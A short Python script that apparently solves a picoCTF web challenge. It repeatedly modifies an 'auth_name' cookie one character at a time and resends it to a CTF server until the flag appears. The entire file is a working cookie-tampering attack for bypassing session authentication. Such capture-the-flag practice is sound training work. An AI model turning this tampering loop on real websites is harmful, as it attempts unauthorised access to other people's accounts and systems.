import requests
import string

candidates = string.ascii_letters + string.digits + '+/'
url = 'http://mercury.picoctf.net:10868/'

flag_format = 'picoCTF{'

def attack(cookie):
    cookies = {'auth_name': cookie}
    res = requests.get(url, cookies=cookies)
    #print(res.text)
    if flag_format in res.text:
        print(cookie)
        print(res.text)
        return True
    return False

while True:
    s = requests.session()
    res = s.get(url)
    cookie = s.cookies.get('auth_name')
    print(cookie)
    for i in range(len(cookie)):
        print(i)
        for c in candidates:
            chall = cookie[:i] + c + cookie[i+1:]
            #print(chall)
            if (attack(chall)):
                exit(0)